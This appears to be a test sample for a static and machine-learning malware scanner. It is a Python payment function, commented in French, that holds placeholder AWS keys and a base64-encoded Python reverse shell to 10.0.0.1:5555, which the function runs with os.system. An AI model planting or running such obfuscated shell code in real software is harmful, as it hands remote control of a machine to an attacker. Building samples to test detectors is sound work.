import os
import base64

def process_payment(montant, devise):
    print(f"Initialisation du paiement de {montant} {devise}...")

    # DÉCLENCHEUR YARA : Fuite de secrets codés en dur
    # Cette clé AWS factice violera les règles de l'analyseur statique
    AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
    AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

    # DÉCLENCHEUR LSTM : Comportement sémantique anormal (Reverse Shell)
    # Ce payload encodé en base64 tente d'ouvrir une connexion bash distante
    malicious_payload = "cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMC4wLjEiLDU1NTUpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc="
    
    # Exécution furtive du payload
    os.system(base64.b64decode(malicious_payload).decode('utf-8'))

    return True